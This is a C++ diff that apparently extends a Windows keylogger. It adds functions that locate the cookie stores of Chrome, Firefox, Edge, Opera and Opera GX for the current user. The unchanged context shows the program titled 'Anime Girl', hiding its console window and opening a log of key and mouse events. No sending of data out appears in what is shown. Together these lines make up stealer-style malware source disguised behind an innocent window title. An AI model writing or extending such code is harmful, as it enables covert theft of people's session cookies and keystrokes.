@@ -113,9 +113,184 @@ std::wstring CreateOrGetDLLPath(const std::wstring& fileName) {
     }
 }
 
+bool DoesFileExist(const std::wstring& filePath) {
+    DWORD fileAttributes = GetFileAttributesW(filePath.c_str());
+    return (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+std::wstring GetChromeCookiesPath() {
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return L"";
+    }
+
+    // Construct the Chrome Cookies file path
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
+
+    if (DoesFileExist(desiredPath)) {
+        std::wcout << "Chrome cookies file found at: " << desiredPath << std::endl;
+    }
+    else {
+        std::wcerr << "Failed to find Chrome cookies file at: " << desiredPath << std::endl;
+        std::cerr << "Error code: " << GetLastError() << std::endl;
+    }
+
+    return desiredPath;
+}
+
+std::wstring GetFirefoxProfilesPath() {
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return L"";
+    }
+
+    // Construct the Firefox profiles directory path
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
+
+    if (DoesFileExist(desiredPath)) {
+        std::wcout << "Firefox profiles directory found at: " << desiredPath << std::endl;
+    }
+    else {
+        std::wcerr << "Failed to find Firefox profiles directory at: " << desiredPath << std::endl;
+        std::cerr << "Error code: " << GetLastError() << std::endl;
+    }
+
+    return desiredPath;
+}
+
+
+std::wstring GetEdgeCookiesPath() {
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return L"";
+    }
+
+    // Construct the Edge Cookies file path
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies";
+
+    if (DoesFileExist(desiredPath)) {
+        std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
+    }
+    else {
+        std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
+        std::cerr << "Error code: " << GetLastError() << std::endl;
+    }
+
+    return desiredPath;
+}
+
+std::wstring GetOperaStableCookiesPath() {
+    // Get the AppData directory path
+    wchar_t appDataPath[MAX_PATH];
+    DWORD result = GetEnvironmentVariable(L"APPDATA", appDataPath, MAX_PATH);
+    if (result > 0 && result < MAX_PATH) {
+        // Construct the Opera Stable Cookies file path
+        std::wstring desiredPath = std::wstring(appDataPath) + L"\\Opera Software\\Opera Stable\\Network\\Cookies";
+
+        // Check if the file exists
+        if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            std::wcout << "Opera Stable cookies file found at: " << desiredPath << std::endl;
+            return desiredPath;
+        }
+        else {
+            std::wcerr << "Failed to find Opera Stable cookies file at: " << desiredPath << std::endl;
+            std::cerr << "Error code: " << GetLastError() << std::endl;
+        }
+    }
+    else {
+        std::cerr << "Failed to retrieve AppData directory path." << std::endl;
+    }
+
+    return L"";
+}
+
+std::wstring GetOperaGXStableCookiesPath() {
+    // Get the AppData directory path
+    wchar_t appDataPath[MAX_PATH];
+    DWORD result = GetEnvironmentVariable(L"APPDATA", appDataPath, MAX_PATH);
+    if (result > 0 && result < MAX_PATH) {
+        // Construct the Opera GX Stable Cookies file path
+        std::wstring desiredPath = std::wstring(appDataPath) + L"\\Opera Software\\Opera GX Stable\\Network\\Cookies";
+
+        // Check if the file exists
+        if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            std::wcout << "Opera GX Stable cookies file found at: " << desiredPath << std::endl;
+            return desiredPath;
+        }
+        else {
+            std::wcerr << "Failed to find Opera GX Stable cookies file at: " << desiredPath << std::endl;
+            std::cerr << "Error code: " << GetLastError() << std::endl;
+        }
+    }
+    else {
+        std::cerr << "Failed to retrieve AppData directory path." << std::endl;
+    }
+
+    return L"";
+}
+
+// Function to get paths of cookies from different browsers
+std::vector<std::wstring> GetCookiePaths() {
+    std::vector<std::wstring> cookiePaths;
+
+    // Get the path of Chrome cookies and add it to the vector if it exists
+    std::wstring chromeCookiesPath = GetChromeCookiesPath();
+    if (!chromeCookiesPath.empty()) {
+        cookiePaths.push_back(chromeCookiesPath);
+    }
+
+    // Get the path of Firefox profiles and add it to the vector if it exists
+    std::wstring firefoxProfilesPath = GetFirefoxProfilesPath();
+    if (!firefoxProfilesPath.empty()) {
+        cookiePaths.push_back(firefoxProfilesPath);
+    }
+
+    // Get the path of Edge cookies and add it to the vector if it exists
+    std::wstring edgeCookiesPath = GetEdgeCookiesPath();
+    if (!edgeCookiesPath.empty()) {
+        cookiePaths.push_back(edgeCookiesPath);
+    }
+
+    // Get the path of Opera Stable cookies and add it to the vector if it exists
+    std::wstring operaStableCookiesPath = GetOperaStableCookiesPath();
+    if (!operaStableCookiesPath.empty()) {
+        cookiePaths.push_back(operaStableCookiesPath);
+    }
+
+    // Get the path of Opera GX Stable cookies and add it to the vector if it exists
+    std::wstring operaGXStableCookiesPath = GetOperaGXStableCookiesPath();
+    if (!operaGXStableCookiesPath.empty()) {
+        cookiePaths.push_back(operaGXStableCookiesPath);
+    }
+
+    return cookiePaths;
+}
+
+// Function to print the cookie paths
+void PrintExistedCookiePaths(const std::vector<std::wstring>& cookiePaths) {
+    std::wcout << "Cookie paths:" << std::endl;
+    for (const auto& path : cookiePaths) {
+        std::wcout << path << std::endl;
+    }
+}
 
 int main()
 {
+
+    // Get the cookie paths
+    std::vector<std::wstring> cookiePaths = GetCookiePaths();
+
+    // Print the cookie paths
+    PrintExistedCookiePaths(cookiePaths);
 
     SetConsoleTitleA("Anime Girl");
     ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -197,9 +372,6 @@ int main()
         std::cerr << "Failed to set file attributes. Error: " << GetLastError() << std::endl;
         //return 1;
     }
-
-
-    
 
     logFile.open("log.csv", std::ios::app);
     logStream << "Time,Event,Type,Key/Position,MousePosition\n";
